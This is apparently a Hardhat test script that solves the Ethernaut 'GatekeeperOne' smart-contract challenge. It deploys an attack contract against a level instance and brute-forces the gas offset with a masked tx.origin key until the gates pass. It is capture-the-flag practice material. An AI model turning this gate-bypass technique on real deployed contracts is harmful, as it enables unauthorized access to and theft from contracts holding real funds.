import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x9b261b23cE149422DE75907C6ac0C30cEc4e652A";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;
let attackContract: Contract;

describe.only("GatekeeperOne", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("GatekeeperOne");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);

        const attackContractFactory = await ethers.getContractFactory("GatekeeperOneAttack");
        attackContract = await attackContractFactory.deploy(contract.address);
    });

    it("Should solve the challenge", async function () {
        expect(await submitInstance(contract.address)).to.be.false;
        
        let gasAmount = 8191 * 100;
        // last 16 chars of address to be masked
        const txOrigin = `${owner.address.slice(-16)}`;

        for (let i = 0; i < 8191; i++) {
            try {
                txn = await attackContract.attack(gasAmount + i, txOrigin, {
                    gasLimit: gasAmount + 8191,
                });
                await txn.wait();
                console.log(`worked with i = ${i}`);
                break;
            } catch (e) {
                // noop
            }
        }


        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});